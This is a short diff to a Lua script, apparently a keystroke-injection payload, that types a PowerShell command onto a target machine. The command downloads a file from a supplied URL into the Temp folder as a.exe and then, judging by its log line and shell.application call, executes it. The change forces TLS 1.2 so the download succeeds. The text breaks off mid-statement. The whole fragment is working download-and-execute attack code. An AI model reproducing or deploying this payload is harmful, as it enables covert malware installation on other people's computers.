@@ -41,7 +41,7 @@ while not cancelled() do
     log("download + execute code")
 
     send_string(
-    "$d=New-Object System.Net.WebClient;" ..
+    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=New-Object System.Net.WebClient;" ..
     "$u='" .. file .. "';" ..
     "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" ..
     "$e=New-Object -com shell.application;" ..
